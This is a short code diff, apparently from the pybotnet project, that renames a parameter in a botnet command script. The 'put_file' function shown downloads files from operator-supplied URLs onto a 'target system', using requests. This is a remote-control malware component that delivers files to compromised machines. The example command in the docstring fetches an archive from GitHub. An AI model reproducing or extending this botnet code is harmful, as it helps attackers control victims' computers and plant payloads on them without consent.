@@ -1,11 +1,11 @@
-from .. import BotNet, Request, UserException
+from .. import BotNet, Context, UserException
 import requests
 import re
 import os
 
 
 @BotNet.default_script(script_version="0.0.1")
-def put_file(request: Request) -> str:
+def put_file(context: Context) -> str:
     """
     put file to target system
 
@@ -15,11 +15,11 @@ def put_file(request: Request) -> str:
     example command:
         `/put_file https://github.com/onionj/pybotnet/archive/refs/heads/master.zip` \n
     """
-    if len(request.command) > 0:
+    if len(context.command) > 0:
         failed_urls = {}
         success_urls = {}
 
-        for i, file_url in enumerate(request.command):
+        for i, file_url in enumerate(context.command):
             index_file_url = (i + 1, file_url)
 
             try:
